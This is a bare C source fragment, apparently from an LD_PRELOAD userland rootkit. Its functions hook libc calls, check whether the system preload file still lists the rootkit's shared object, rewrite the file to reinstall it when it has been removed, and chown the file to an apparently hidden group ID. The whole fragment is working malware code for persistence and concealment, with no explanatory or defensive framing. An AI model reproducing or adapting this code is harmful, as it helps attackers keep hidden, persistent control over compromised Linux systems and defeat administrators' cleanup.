int _preloadok(const char *preloadpath){ // returns 1 if preloadpath is ok.
    struct stat preloadstat;
    int status = 1,
        statret;

    hook(C__XSTAT);
    memset(&preloadstat, 0, sizeof(stat));
    statret = (long)call(C__XSTAT, _STAT_VER, preloadpath, &preloadstat);

    if((statret < 0 && errno == ENOENT) || preloadstat.st_size != strlen(SOPATH))
        status = 0;

    if(status != 0) chown_path(preloadpath, readgid());
    return status;
}

int preloadok(void){
    char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    preloadpath = PRELOAD_FILE;
#endif
    return _preloadok(preloadpath);
}

void reinstall(const char *preloadpath){
    if(preloadok())
        return;

    hook(CFOPEN, CFWRITE);
    FILE *ldfp = call(CFOPEN, preloadpath, "w");

    if(ldfp != NULL){
        call(CFWRITE, SOPATH, 1, strlen(SOPATH), ldfp);
        fflush(ldfp);
        fclose(ldfp);
        chown_path(preloadpath, readgid());
    }

    return;
}
